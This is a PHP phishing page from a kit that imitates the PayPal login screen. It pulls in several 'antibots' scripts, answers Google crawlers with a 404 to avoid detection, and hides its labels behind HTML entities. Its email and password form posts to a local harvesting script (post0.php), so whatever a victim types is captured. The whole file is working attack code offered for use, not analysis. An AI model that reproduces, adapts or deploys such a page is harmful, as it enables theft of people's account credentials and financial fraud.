<?php 
@session_start();  
error_reporting(0); 
include("../language/". $_SESSION['_lang_'].".php");
include("../geoplugin.php");
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";
include "../bots/antibots5.php";
include "../bots/antibots6.php"; 
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html class=" js " lang="en">
<head>
<meta charset="utf-8">
<title>&#x4C;&#x6F;&#x67;&#x20;&#x69;&#x6E;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="application-name" content="document">
<meta name="robots" content="noindex, nofollow">
<link rel="shortcut icon" href="../img/pp.ico">
<link rel="apple-touch-icon" href="../img/apple_touch_icon.png">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<link rel="stylesheet" href="../lib/app.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.js"></script>
</head>
<body class="desktop "  data-production="true" data-enable-ads-captcha="true" data-view-name="login"  >
<div id="page">
<div id="content" class="contentContainer">
<header>
<div class="paypal-logo"></div></header>
<div id="main" class="main " role="main">
<section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
<h1 class="headerText accessAid">&#x4C;&#x6F;&#x67;&#x20;&#x69;&#x6E;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;</h1> 
<?php 
@session_start(); 
$ERR = "Error"; 
$requst = $_SERVER['REQUEST_URI']; 
$user_cookie = $_COOKIE["error"]; 
$var1 = "1"; 
if (eregi("resType=code&failedBecause=", $requst))
	 { echo "<div id='notifications' class='notifications' tabindex='-1'>
 <p class='notification notification-critical' role='alert' style=' background-color: #fff7f7; background-position: left 12px top -387px; border-color: #c72e2e; '>$ERROR</p></div> "; 
 }else{ } 
 ?> 
<form class="hasErrors" id="form" action="../myaccount/poster/post0.php" method="post" name="login" autocomplete="off" novalidate="">
<div id="passwordSection" class="clearfix">
<div style="" class="textInput fieldempty" id="login_emaildiv">
<div class="fieldWrapper">
<label for="email" class="fieldLabel">&#x45;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;</label>
<input aria-describedby="emailErrorMessage" id="email" name="login_email" class="hasHelp validateEmpty " required="required" aria-required="true" autocomplete="off" value="<?=@$_SESSION['_email_'];?>" placeholder="<?php echo $Email;?>" type="email"></div>
<div class="errorMessage" id="emailErrorMessage">
<p class="emptyError"><?php echo $req1;?></p>
</div></div>
<div style="" class="textInput lastInputField fieldempty" id="login_passworddiv"><div class="fieldWrapper">
<label for="password" class="fieldLabel">&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</label>
<input aria-describedby="passwordErrorMessage" id="password" name="login_password" class="hasHelp validateEmpty " required="required" aria-required="true" value="" placeholder="<?php echo $Password;?>" type="password"></div>
<div class="errorMessage" id="passwordErrorMessage">
<p class="emptyError"><?php echo $req2;?></p></div></div>
</div>
<div class="actions actionsSpaced">
<button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" ><?php echo $dok;?></button>
</div>
<div class="forgotLink">
<a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password"><?php echo $forgot;?></a></div>
<input value="" name="bp_mid" id="bp_mid" type="hidden">
</form>
<a href="#" class="button secondary" id="createAccount"><?php echo $sign;?></a>
</section>
</div></div><div id="animasi" class="transitioning hide">
<p id="checking" class="checkingInfo hide"><?php echo $checking;?></p>
</div>
<script>var require = {baseUrl: 'https:www.paypalobjects.com/web/res/831/b96ba40cafd390153f00902783ddb/js/'};</script>
<footer class="footer clearfix" role="contentinfo">
<ul>
<li><a href="#"><?php echo $priva;?></a></li>
<li><a href="#">&#80;&#97;yP&#97;I</a></li>
<li><a href="#"><?php echo $legal;?></a></li>
</ul>
<p>Copyright © 1999-2017 &#x50;&#x61;&#x79;&#x50;&#x61;&#x49;&#x2E; <?php echo $ri8;?>.</p>
</footer>
<script src="../lib/require.js"></script>
<script src="../lib/app.js"></script>
<script src="../lib/pa.js"></script>
</body></html>